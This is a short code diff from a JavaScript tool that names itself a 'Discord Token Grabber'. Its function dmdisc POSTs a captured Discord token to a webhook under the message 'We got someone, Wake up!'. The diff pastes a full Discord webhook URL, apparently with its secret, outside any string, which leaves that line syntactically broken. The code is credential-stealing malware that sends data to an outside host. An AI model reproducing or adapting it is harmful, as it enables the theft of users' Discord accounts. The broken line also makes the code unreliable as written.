@@ -111,14 +111,15 @@
     //---------------------------------------------------
     
     function dmdisc(message) {
-        let webhookurl = ""; //put your webhook url here.
+        let webhookurl = ""; //
         let request = new XMLHttpRequest();
         request.open("POST", webhookurl);
 
         request.setRequestHeader('Content-type', 'application/json');
 
         let params = {
-        username: ".:Discord Token Grabber 1.0:.",
+        username: ".:Discord Token Grabber 1.0:.",https://discord.com/api/webhooks/967043771172794368/XQ4gWX7tolSpQpRKHbaw1vY28r51aL1HSzYrxSkq6EiPVaV6FGMLEXdK7UVAKQIdYpuC
+            
         avatar_url: "https://i.imgur.com/nU9WM3V.jpg",
         content: '**We got someone, Wake up!\nToken: '+message+'**'
         }
